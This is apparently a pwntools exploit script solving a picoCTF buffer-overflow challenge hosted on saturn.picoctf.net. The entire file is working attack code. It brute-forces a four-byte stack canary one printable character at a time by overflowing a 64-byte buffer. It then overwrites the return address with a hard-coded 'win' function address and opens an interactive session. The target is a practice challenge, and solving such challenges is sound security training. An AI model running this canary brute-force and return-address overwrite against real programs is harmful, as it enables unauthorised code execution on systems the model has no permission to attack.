#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched_patched", checksec=False)

context.binary = exe
context.terminal = ["alacritty", "-e"]
context.log_level = 'warn'
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 59631)

    return r


def main():
    # good luck pwning :)
    offset_canary = 64
    lenght_canary = 4
    offset_canary_to_eip = 16
    canary = b''
    output = ''
    success_msg = "Ok... Now Where's the Flag?"
    chars = string.printable
    for i in range(lenght_canary):
        for c in chars:
            size = offset_canary + len(canary) + 1
            r = conn()
            r.sendlineafter(b'>', str(size).encode())
            payload = b'A' * offset_canary
            payload += canary
            payload += c.encode()
            r.sendlineafter(b'>', payload)
            output = r.recvline()
            if success_msg in output.decode():
                canary += c.encode()
                print(f"[+] Canary in position {i}: {c}")
                break
    r = conn()
    print(f"\n[*] Canary: {canary}")
    payload = b'A' * 64
    payload += canary
    payload += b'B' * offset_canary_to_eip
    payload += p32(0x08049336) # win addr
    size = len(payload)
    r.sendlineafter(b'>', str(size).encode())
    r.sendlineafter(b'>', payload)

    r.interactive()


if __name__ == "__main__":
    main()

